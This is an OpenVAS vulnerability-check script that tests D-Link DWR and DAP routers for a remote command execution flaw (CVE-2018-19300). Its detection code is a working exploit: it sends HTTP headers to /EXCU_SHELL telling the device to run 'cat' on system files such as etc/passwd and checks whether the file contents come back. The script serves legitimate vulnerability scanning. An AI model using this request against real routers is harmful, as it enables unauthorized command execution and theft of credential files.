###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dwr_rce_vuln.nasl 14234 2019-03-17 07:48:10Z cfischer $
#
# D-Link DWR/DAP Remote Code Execution Vulnerability
#
# Authors:
# Jan Philipp Schulte
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113294");
  script_version("2019-03-25T12:00:38+0000");
  script_tag(name:"last_modification", value:"2019-03-25 12:00:38 +0000 (Mon, 25 Mar 2019)");
  script_tag(name:"creation_date", value:"2018-11-08 17:13:37 +0100 (Thu, 08 Nov 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-19300");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DWR/DAP Remote Code Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772");
  script_xref(name:"URL", value:"https://www.greenbone.net/schwerwiegende-sicherheitsluecke-in-d-link-routern-entdeckt/");
  script_xref(name:"URL", value:"https://eu.dlink.com/de/de/support/support-news/2019/march/19/remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers");

  script_tag(name:"summary", value:"D-Link DWR and DAP Routers are prone to a Remote Code Execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to exploit the vulnerability to read a file from the target system.");

  script_tag(name:"insight", value:"The vulnerability exists within /EXCU_SHELL, which processes HTTP requests
  and performs any commands given to it on the target system with admin privileges.");

  script_tag(name:"impact", value:"Successful exploitation would give an attacker complete control
  over the target system.");

  script_tag(name:"affected", value:"D-Link DWR and DAP Routers. Other devices and vendors might be
  affected as well. Please see the referenced vendor advisory for a complete list of affected
  devices.");

  script_tag(name:"solution", value:"The vendor has started to release firmware updates to address this issue.
  Please see the references for more information.");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default: 80 );

url = '/EXCU_SHELL';

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  add_headers = make_array( 'cmdnum', '1', 'command1', 'cat /' + file, 'confirm1', 'n' );
  req = http_get_req( port: port, url: url, add_headers: add_headers, accept_header: '*/*', host_header_use_ip: TRUE );
  res = http_keepalive_send_recv( port: port, data: req );
  if( egrep( pattern: pattern, string: res, icase: TRUE ) || (file == 'etc/passwd' && res =~ 'admin:[^:]*:0' ) ) {
    report = report_vuln_url( url: url, port: port );
    security_message( data: report, port: port );
    exit( 0 );
  }
}

exit( 99 );
